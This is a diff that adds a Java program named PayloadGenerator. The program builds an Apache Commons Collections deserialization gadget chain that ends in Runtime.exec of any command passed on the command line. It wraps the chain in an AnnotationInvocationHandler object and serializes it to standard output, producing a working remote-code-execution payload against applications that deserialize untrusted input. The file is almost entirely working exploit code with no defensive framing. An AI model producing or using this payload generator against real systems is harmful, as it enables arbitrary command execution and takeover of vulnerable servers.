@@ -1,0 +1,41 @@
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.io.ObjectOutputStream;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.util.HashMap;
+import java.util.Map;
+
+public class PayloadGenerator {
+
+    public static void main(String[] args) throws Exception {
+        String command = args[0];
+
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[]{String.class}, new Object[]{"getRuntime"}),
+                new InvokerTransformer("invoke", new Class[]{Object.class}, new Object[]{null}),
+                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{command})
+        };
+
+        Transformer transformerChain = new ChainedTransformer(transformers);
+
+        Map originalMap = new HashMap();
+        originalMap.put("value", "value");
+        Map decoratedMap = TransformedMap.decorate(originalMap, null, transformerChain);
+
+        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class);
+        ctor.setAccessible(true);
+        Object aih = ctor.newInstance(Target.class, decoratedMap);
+
+        ObjectOutputStream oos = new ObjectOutputStream(System.out);
+        oos.writeObject(aih);
+        oos.close();
+    }
+
+}
